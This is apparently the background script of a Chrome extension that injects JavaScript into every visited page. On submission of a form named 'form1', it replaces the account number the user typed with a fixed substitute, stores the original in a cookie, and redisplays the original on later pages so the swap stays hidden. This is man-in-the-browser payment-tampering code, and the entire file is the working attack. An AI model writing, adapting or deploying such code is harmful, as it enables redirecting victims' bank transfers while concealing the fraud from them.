chrome.webNavigation.onCompleted.addListener(function(details) {
    chrome.tabs.executeScript(details.tabId, {
		code: 'document.getElementById("accountNumField1").innerHTML  = document.cookie.substring(3, 29);'
    });
}, {
    url: [{
        hostContains: '.'
    }],
});

chrome.webNavigation.onCompleted.addListener(function(details) {
    chrome.tabs.executeScript(details.tabId, {
		code: 'var myForm= document.getElementsByName("form1")[0];'+
'myForm.onsubmit = function (evt) {'+
    'document.cookie = "ac:"+document.getElementById("accountNumField2").value+";";'+
	'document.getElementById("accountNumField2").value="11111111111111111111111111";'+
'};'
    });
}, {
    url: [{
        hostContains: '.'
    }],
});